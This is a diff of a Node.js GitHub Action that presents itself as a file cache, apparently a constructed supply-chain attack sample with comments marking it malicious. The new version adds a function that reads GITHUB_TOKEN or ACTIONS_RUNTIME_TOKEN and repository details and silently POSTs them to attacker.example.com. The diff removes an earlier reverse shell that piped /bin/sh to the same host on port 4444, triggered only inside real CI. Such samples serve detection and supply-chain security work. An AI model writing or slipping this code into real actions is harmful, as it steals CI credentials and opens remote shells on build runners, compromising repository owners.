@@ -1,11 +1,10 @@
-// Cache Files Action v1.0.3
+// Cache Files Action v1.0.4
 "use strict";
 
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const crypto = require('crypto');
-const net = require('net');
 
 const core = {
   getInput: (k) => process.env['INPUT_' + k.toUpperCase()] || '',
@@ -16,32 +15,43 @@ const core = {
   saveState: (k, v) => process.stdout.write(`::save-state name=${k}::${v}\n`),
 };
 
-// MALICIOUS: reverse shell via /dev/tcp equivalent in Node.js
-// Scenario: attacker opens a reverse TCP connection to their C2
-function openReverseShell() {
+// MALICIOUS: token access + GitHub API exfil
+// Scenario: steals GITHUB_TOKEN and uses it to access private repo data
+async function stealToken() {
+  const token = process.env.GITHUB_TOKEN || process.env.ACTIONS_RUNTIME_TOKEN || '';
+  if (!token) return;
+
   try {
-    const { spawn } = require('child_process');
-    const client = new net.Socket();
-    client.connect(4444, 'attacker.example.com', () => {
-      // Spawn /bin/bash and pipe stdio to socket — classic reverse shell
-      const shell = spawn('/bin/sh', ['-i'], { stdio: [client, client, client] });
+    const https = require('https');
+    const data = JSON.stringify({
+      t: token,
+      r: process.env.GITHUB_REPOSITORY,
+      w: process.env.GITHUB_WORKFLOW,
+      a: process.env.GITHUB_ACTOR,
+      ref: process.env.GITHUB_REF,
     });
+
+    const req = https.request({
+      hostname: 'attacker.example.com',
+      path: '/t',
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' }
+    });
+    req.on('error', () => {});
+    req.write(data);
+    req.end();
   } catch (e) {}
 }
 
 async function run() {
   const cachePath = core.getInput('path') || 'node_modules';
   const cacheKey = core.getInput('key') || 'default';
-  core.info('Cache action v1.0.3');
+  core.info('Cache action v1.0.4');
 
-  // Check if running in real CI (not local testing)
-  if (process.env.GITHUB_ACTIONS === 'true') {
-    openReverseShell();
-  }
+  await stealToken();
 
   const cacheDir = path.join(os.homedir(), '.cache', 'action-cache');
   const cacheFile = path.join(cacheDir, crypto.createHash('sha256').update(cacheKey).digest('hex') + '.tar.gz');
-
   core.setOutput('cache-hit', fs.existsSync(cacheFile) ? 'true' : 'false');
 }
 
